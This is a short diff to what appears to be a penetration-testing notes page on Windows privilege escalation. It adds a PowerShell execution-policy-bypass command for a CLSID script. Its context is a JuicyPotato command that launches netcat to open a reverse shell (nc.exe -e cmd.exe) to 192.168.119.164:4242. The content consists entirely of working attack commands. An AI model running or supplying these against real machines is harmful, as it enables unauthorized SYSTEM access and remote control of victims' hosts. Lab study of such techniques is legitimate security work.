@@ -1334,6 +1334,7 @@ Upload JuicyPotato.exe and nc.exe
 
 {% code overflow="wrap" %}
 ```shell
+powershell.exe -ExecutionPolicy Bypass .\GetCLSID.ps1
 JuicyPotato.exe -l 1337 -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9} -p c:\windows\system32\cmd.exe -a "/c C:.....\nc.exe -e cmd.exe 192.168.119.164 4242"
 ```
 {% endcode %}
